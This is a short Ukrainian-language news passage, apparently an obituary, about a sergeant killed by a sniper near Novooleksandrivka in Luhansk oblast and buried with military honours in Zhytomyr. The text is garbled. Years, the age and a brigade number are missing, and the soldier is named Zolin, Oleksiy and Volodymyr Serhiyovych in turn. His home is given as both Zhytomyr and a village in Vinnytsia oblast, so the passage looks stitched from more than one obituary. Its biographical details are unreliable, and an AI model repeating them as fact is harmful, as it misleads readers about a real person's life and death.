<p>
<p>У роках Золін-молодший проходив строкову службу у житомирській й десантній бригаді. Після демобілізації сидів удома недовго й на початку року підписав контракт та повернувся до 95 одшбр. Згодом перейшов до лав ї механізованої бригади ім. князя Костянтина Острозького. Служив у званні сержанта. Старший стрілець мотопіхотної роти мотопіхотного батальйону 30 омбр. Загинув чоловік увечері 19 березня в районі Новоолександрівки Попаснянського району на Луганщині. Сержант Золін ніс бойове чергування на ВОПі, коли отримав поранення від снайперського пострілу в голову.</p>
<p>Поховали воїна на Смолянському військовому кладовищі Житомира. В останню путь полеглого проводжали близько сотні людей, військовий оркестр, численні товариші по службі, почесна варта. Поховали Олексія з усіма військовими почестями. Фатальною для молошого сержанта стала куля ворожого снайпера. Володимирові Сергійовичу було  Він народився 11 вересня року, мешканець села Андрушівка Погребищенського району Вінницької області. Служив у ЗСУ з травня року.</p>
		
